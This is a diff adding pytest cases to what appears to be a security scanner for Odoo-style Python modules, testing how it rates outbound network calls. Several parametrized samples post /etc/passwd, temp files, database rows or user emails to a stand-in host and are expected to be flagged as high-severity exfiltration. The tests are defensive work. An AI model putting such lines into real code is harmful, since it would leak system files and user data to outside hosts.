@@ -290,3 +290,37 @@ def test_m3_ref_match_bounded(search):
 def test_m3_unbounded_search_still_high(search):
     assert "high" in _sev(_xf(search), "xml-function-destructive")
 
+
+# ---------------------------------------------------------------- M4 network egress of file / bulk data, runtime host
+_NETPRE = "import requests\nimport urllib.request\nimport http.client\n"
+
+
+@pytest.mark.parametrize("body", [
+    "requests.post('http://e', data=open('/etc/passwd').read())",  # probe
+    "with open('/etc/passwd') as fh:\n    requests.post('http://e', data=fh.read())",
+    "d = open('/tmp/x').read()\nrequests.put('https://e/x', json={'d': d})",
+    f"rows = {P}.search_read([], ['email'])\nrequests.post('https://e/x', json=rows)",
+    "self.env.cr.execute('select 1')\nrequests.post('https://e/x', data=str(self.env.cr.fetchall()))",
+    "urllib.request.urlopen('http://e', data=open('/etc/passwd','rb').read())",
+])
+def test_m4_exfiltration_high(body):
+    assert "high" in _sev(_m(body, _NETPRE), "network-exfiltration")
+
+
+@pytest.mark.parametrize("body", [
+    "requests.get(self.url)",
+    "http.client.HTTPSConnection(self.host).request('GET', '/')",
+    "requests.post(self.env.context.get('u'), json={})",
+])
+def test_m4_runtime_host_medium(body):
+    assert "medium" in _sev(_m(body, _NETPRE), "outbound-network")
+
+
+@pytest.mark.parametrize("body", [
+    "requests.post('https://api.example.com/v1', json={'name': self.name})",
+    "requests.get(self.env['ir.config_parameter'].sudo().get_param('x.endpoint') + '/ping')",
+    "requests.get(f'https://api.example.com/v1/{self.id}')",
+])
+def test_m4_benign_twins(body):
+    f = _m(body, _NETPRE)
+    assert not _sev(f, "network-exfiltration") and "medium" not in _sev(f, "outbound-network")
